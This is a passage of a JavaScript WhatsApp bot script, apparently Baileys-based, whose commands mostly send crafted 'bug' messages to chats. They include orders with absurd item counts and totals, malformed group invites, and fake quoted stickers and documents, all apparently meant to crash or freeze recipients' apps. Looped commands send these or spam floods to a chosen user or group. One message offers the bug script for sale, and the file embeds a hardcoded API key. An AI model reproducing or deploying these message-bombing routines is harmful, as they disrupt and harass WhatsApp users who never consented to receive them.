}.jpeg`,
						"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
						"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
						"mediaKeyTimestamp": "1659416157",
}
}), { userJid: m.chat })
liaacans.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
case 'bug1': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
"mimetype": "audio/mpeg",
"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
"fileLength": "258330",
"seconds": 16,
"ptt": false,
"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
"mediaKeyTimestamp": "1657190832",
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
}
break
case 'bug2': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/thumbnail.jpg') }, { upload: liaacans.waUploadToServer })
var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc",
"mimetype": "image/jpeg",
"caption": `© ${global.creator}`,
"fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=",
"fileLength": "42521",
"height": 426,
"width": 640,
"mediaKey": "6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=",
"fileEncSha256": "Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=",
"directPath": "/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1",
"mediaKeyTimestamp": "1657286523",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, image.message, { messageId: image.key.id })
}
break
case 'bug3': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/thumbnail.jpg') }, { upload: liaacans.waUploadToServer })
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
"mimetype": "application/octet-stream",
"title": ".dev",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
"fileName": `© RAHXMODS${ngazap(prefix)}`,
"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
"directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
"mediaKeyTimestamp": "1657288637",
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
case 'bug4': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": `https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K\n\n© RAHXMODS`,
"matchedText": "https://chat.whatsapp.com/Jh7zaCSnPCBC4gdYOEVm0K",
"description": "Undangan Grup WhatsApp",
"title": `© RAHXMODS${ngazap(prefix)}`,
"previewType": "NONE",
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
break
case 'bug5': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
}
break
case 'bug6': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/thumbnail.jpg') }, { upload: liaacans.waUploadToServer })
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": "https://wa.me/6285821676621",
"matchedText": "https://wa.me/6285821676621",
"description": "Beli Sc Bug? Chat Wa Owner Ya Kak",
"title": `© Auliahost-BOT`,
"previewType": "NONE",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
break
case 'bug7': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `© Auliahost-BOT`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:liaacans\nitem1.TEL;waid=6285714170944:+62 857-1417-0944\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:Developer RAHXMODSWhatsApp / Script Bot ORDER ? CHAT AJA 👋\nX-WA-BIZ-NAME:liaacans\nEND:VCARD",
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
}
break
case 'lokas': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/thumbnail.jpg') }, { upload: liaacans.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© Auliahost-BOT`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
break
case 'buglokas': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/thumbnail.jpg') }, { upload: liaacans.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `© ${global.creator}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, location.message, { messageId: location.key.id })
}
break
case 'buginvite': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/thumbnail.jpg') }, { upload: liaacans.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `Bug By RahmxMods`,
"groupName": `Awoaawokaowk`,
"caption": `${global.creator}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
}
break
case 'troli': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/thumbnail.jpg') }, { upload: liaacans.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": "449756950375071",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© Awoakwoakwok`,
"jpegThumbnail":fs.readFileSync('./image/image.jpg'),
"orderTitle": `© ${global.creator}`,
"sellerJid": "6285714170944@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break
case 'catalog': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/thumbnail.jpg') }, { upload: liaacans.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `© Bug By Rahmxmods`,
"description": `© Awokaowk`,
"currencyCode": "IDR",
"footerText": `© ${global.creator}`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© ${global.creator}`,
"url": "wa.me/6285714170944"
},
"businessOwnerJid": "6285714170944@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: doc })
liaacans.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
case 'catalogpc': case 'cataloggc':  {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/thumbnail.jpg') }, { upload: liaacans.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `© Bug By RAHMXMODS`,
"description": `© AwoKaok`,
"currencyCode": "IDR",
"footerText": `© ${global.creator}`,
"productImageCount": 1,
"firstImageId": 1,
"retailerId": `© ${global.creator}`,
"url": "wa.me/6285714170944"
},
"businessOwnerJid": "6285714170944@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: doc})
liaacans.relayMessage(num, catalog.message, { messageId: catalog.key.id })
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
m.reply(tekteka)
}
break
case 'ampas1' : {
if (!isCreator) throw mess.owner
if (!m.isGroup) throw mess.group
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await liaacans.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
}
break
case 'ampas2' : {
if (!isCreator) throw mess.owner
if (!m.isGroup) throw mess.group
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
a = await liaacans.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(20)
liaacans.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
await sleep(10000)
}
break
case 'bugstik':{
if (!isCreator) throw mess.owner
if (!m.isGroup) throw mess.group
if (args.length == 0) return anjay(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku LiaaCans`
for (let i = 0; i < jumlah; i++) {
liaacans.sendMessage(m.chat, {sticker: global.thumb},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
}
deploy(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'bugie':{
if (!isCreator) throw mess.owner
if (!m.isGroup) throw mess.group
if (args.length == 0) return anjay(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku LiaaCans`
for (let i = 0; i < jumlah; i++) {
liaacans.sendMessage(m.chat, {document: global.thumb},{quoted: {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `RAHXMODS`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
}
}
}})
}
m.reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'bugtag': {
if (!isCreator) throw mess.owner
if (!m.isGroup) throw mess.group
liaacans.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: doc })
}
break
case 'runtime': case 'tes': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
            	let lowq = `*Bot Telah Online Selama*\n*${runtime(process.uptime())}*`
                let buttons = [{ buttonId: 'donasi', buttonText: { displayText: 'DONASI' }, type: 1 }]
                await liaacans.sendButtonText(m.chat, buttons, lowq, creator, m, { quoted: fkontak })
                }
            break
case 'setppbot': {
                if (!isCreator) throw mess.owner
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await liaacans.downloadAndSaveMediaMessage(quoted)
                await liaacans.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
case 'listonline': case 'liston': {
            if (!isCreator) throw mess.owner
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    liaacans.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
case 'listpc': {
      if (!isCreator) throw mess.owner
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 liaacans.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
                if (!isCreator) throw mess.owner
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await liaacans.groupMetadata(i)
                     teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 liaacans.sendTextWithMentions(m.chat, teks, m)
             }
             break
case 'rules':
rules = `☰⟥⟝⟞⟝❨ *Rᴜʟᴇs Mʏ Bᴏᴛ* ❩⟞⟝⟞⟤☰
➯ *Tɪᴅᴀᴋ Sᴘᴀᴍ Bᴏᴛ*
⟬Kᴀʟᴏ Uᴅᴀʜ Dɪ Bᴀɴ/Bʟᴏᴋ Jᴀɴɢᴀɴ Nɢᴇᴍɪs Mɪɴᴛᴀ Uɴʙᴀɴ/Uɴʙʟᴏᴋ⟭
➯ *Tɪᴅᴀᴋ Mᴇɴᴊᴜᴀʟ Nᴏᴍᴏʀ Bᴏᴛ!*
⟬Mɪɴɪᴍᴀʟ Mᴀɴᴅɪ Wᴀᴊɪʙ Dᴜʟᴜ Bʀᴏ Bɪᴀʀ Tᴀᴜ Dɪᴍᴀɴᴀ Lᴇᴛᴀᴋ Kᴇsᴀʟᴀʜᴀɴ Lᴜ⟭
➯ *Cᴀʟʟ AᴜᴛᴏBʟᴏᴄᴋ*
⟬Mᴀᴍᴘᴜs Lᴜ⟭
➯ *Mᴀᴋsᴀ Mɪɴᴛᴀ Sᴄʀɪᴘᴛ Bᴏᴛ*
⟬Eᴍᴀɴɢ Nʏᴀ Lᴜ Sᴀᴘᴀ? Uᴅʜ Mɪɴᴛᴀ Mᴀᴋsᴀ Pᴜʟᴀ⟭
➯ *Hɪɴᴀ Bᴏᴛ Gᴡ*
⟬Nɢᴇʜɪɴᴀ Eʟɪᴛ,Bᴜᴋᴛɪ Sᴜʟɪᴛ⟭
➯ *Bot Delay/Lama Bles?*
⟬Lu Di Chet Ayang Lu Aja Lama Blesny⟭
➯ *Maksa Masukin Gc Lu*
⟬Minimal Donasi Lah Cuy Biar Cuan Gw⟭
➯ *Chet Aneh² Di Cwe Gw, Gw Block Lu Hdup²*
⟬Mɪɴɪᴍᴀʟ Nɢᴏᴛᴀᴋ⟭
❏┳━━◩
┍┛
┆⟥⟤ ➠ Bot Whatsapp By Auliahost-BOT
└─┈⟅`
             m.reply(rules)
             break
case 'jadibot': { // Fix Aja Kalau Bisa Kak!
if(!isPremium) throw mess.prem
jadibot(liaacans, m, m.chat)
}
break
case 'listjadibot':
if (!isPremium) throw mess.prem
try {
let user = [... new Set([...global.conns.filter(liaacans => liaacans.user).map(liaacans => liaacans.user)])]
te = "*List Jadibot*\n\n"
for (let i of user){
let y = await liaacans.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
liaacans.sendMessage(m.chat,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
m.reply(`Belum Ada User Yang Jadibot`)
}
break
case 'tts':{
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!q) return m.reply(`Contoh:\n${prefix+command} hallo bro`)
var tts = `https://saipulanuar.ga/api/text-to-audio/tts?text=${q}&idbahasa=id&apikey=jPHjZpQF`
